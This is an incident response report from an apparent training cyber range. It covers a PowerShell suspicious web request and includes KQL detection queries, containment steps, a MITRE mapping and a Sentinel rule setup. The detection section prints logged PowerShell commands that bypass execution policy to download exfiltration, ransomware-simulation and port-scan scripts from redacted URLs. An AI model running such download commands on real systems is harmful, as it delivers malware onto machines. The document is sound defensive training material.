# PowerShell-Suspicious-Web-Request-


# 🛡️ Incident Response Report – Haider Naqvi  
**Scenario 2: PowerShell Suspicious Web Request**  
**Framework:** NIST 800-61 (Computer Security Incident Handling Lifecycle)

---

## 📌 Overview
This incident involved a suspicious PowerShell command used to download potentially malicious scripts on a corporate endpoint. This type of behavior is consistent with initial stages of an attack where an actor attempts to transfer tools to gain persistence, escalate privileges, or exfiltrate data.

---

## 🧠 Step 1: Detection and Analysis

```
Device Involved: windows-target-1  
User: 1 user (confirmed)  
Indicator: PowerShell use of 'Invoke-WebRequest' with 'ExecutionPolicy Bypass'  
```

### 🧪 Suspicious PowerShell Commands Logged

```
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../eicar.ps1 -OutFile C:\programdata\eicar.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../portscan.ps1 -OutFile C:\programdata\portscan.ps1
```

---

## 🧾 User Feedback

```
User stated they downloaded a free tool; a black screen appeared for a second and then disappeared.
```

---

### 🔍 KQL Query – Detecting PowerShell Web Request Activity

```kql
let TargetDevice = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-webrequest"
```

### 📁 KQL Query – Confirm Script Execution on Target

```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

---

### 🧬 Reverse Engineering – Script Intent Summary

```
exfiltratedata.ps1 → Simulated data exfiltration to external source  
eicar.ps1 → EICAR antivirus test file  
pwncrypt.ps1 → Encrypts files (ransomware simulation)  
portscan.ps1 → Network port scanner  
```

---

## 🛡️ Step 2: Containment, Eradication, and Recovery

```
✔ Isolated the machine using Microsoft Defender for Endpoint (MDE)  
✔ Ran a full anti-malware scan  
✔ Verified no persistence or lateral movement  
✔ Removed machine from isolation and restored operations  
```

---

## 📘 Step 3: Post-Incident Activity

```
📌 Required user to complete enhanced cybersecurity training  
📌 Upgraded KnowBe4 training program and increased campaign frequency  
📌 Began enforcing PowerShell execution restrictions for non-admin users  
```

---

## 🧩 MITRE ATT&CK Mapping

```
T1059.001 – PowerShell (scripting abuse)  
T1105 – Ingress Tool Transfer (external download)  
T1071.001 – Web Protocols (HTTP/HTTPS-based download)  
T1562.001 – Disable or Modify Tools: ExecutionPolicy Bypass  
```

---

## 🔧 Microsoft Sentinel Analytics Rule Setup

### 📌 General Rule Configuration

![Sentinel Rule - General Tab](/assets/screenshots/Screenshot_28-5-2025_221759_portal.azure.com.jpeg)

```
Rule Name: Haider – Powershell Suspicious Web Request  
Severity: Medium  
MITRE ATT&CK: 7 techniques selected  
Status: Enabled  
Description: Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence...
```

---

### 📊 Rule Logic and Query Scheduling

![Sentinel Rule - Query Tab](/assets/screenshots/Screenshot_28-5-2025_221851_portal.azure.com.jpeg)

```
Query Logic:
let TargetDevice = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-webrequest"

Schedule:
Run every: 4 hours  
Lookback period: 24 hours  
Start: Automatically  
```

---

## ✅ Final Notes

```
This incident emphasizes the importance of PowerShell monitoring, user awareness, and proactive alert tuning.  
All scripts involved were simulated for training purposes and handled within a safe cyber range.
```

---

*Maintained by: Haider Naqvi*  
*Cybersecurity Analyst | Incident Response | Microsoft Sentinel | Defender for Endpoint*
